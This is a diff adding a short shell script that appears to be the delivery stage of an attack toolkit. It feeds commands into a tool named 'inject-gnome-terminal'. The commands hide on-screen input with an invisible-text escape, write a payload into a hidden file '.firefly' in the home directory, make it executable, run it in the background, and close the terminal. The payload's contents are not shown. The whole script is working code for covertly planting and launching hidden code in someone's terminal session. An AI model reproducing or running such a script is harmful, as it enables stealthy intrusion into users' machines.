@@ -1,0 +1,24 @@
+#!/bin/sh
+
+CWD=`dirname $0`
+ARG=$1
+
+(# Hide input
+echo 'echo -e "\e[8m"'
+echo "cd"
+# Dump payload
+echo "cat <<EOF > .firefly"
+cat ${CWD}/payload
+echo EOF
+# Enable scroll-lock
+echo "xmodmap -e 'add mod3 = Scroll_Lock'"
+# Run payload
+echo "chmod 700 ./.firefly"
+if [ -z "$ARG" ]
+then
+  echo "./.firefly &"
+else
+  echo "./.firefly \"${ARG}\" &"
+fi
+echo sleep 1
+echo exit) | ${PLPATH}/inject-gnome-terminal
